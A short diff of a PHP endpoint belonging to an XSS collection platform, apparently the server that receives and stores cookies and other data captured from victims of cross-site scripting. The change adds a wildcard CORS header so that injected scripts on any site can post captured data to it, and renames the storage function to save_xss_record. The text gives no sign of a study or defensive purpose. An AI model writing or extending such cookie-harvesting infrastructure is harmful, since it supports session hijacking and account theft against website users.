@@ -5,6 +5,7 @@ define("IN_XSS_PLATFORM",true);
 if(count($_GET)==0&&count($_POST)==0&&count($_COOKIE)==0)
 	exit();
 */
+header("Access-Control-Allow-Origin:*"); 
 require_once("functions.php");
 require_once("dio.php");
 
@@ -51,5 +52,5 @@ if($decoded_cookie_data)
 //判断是否keepsession（判断标准：get或者post或者cookie包含keepsession=1）
 $info['keepsession']=isKeepSession($info)?true:false;
 
-saveInfo(json_encode($info),$request_time);
+save_xss_record(json_encode($info),$request_time);
 ?>
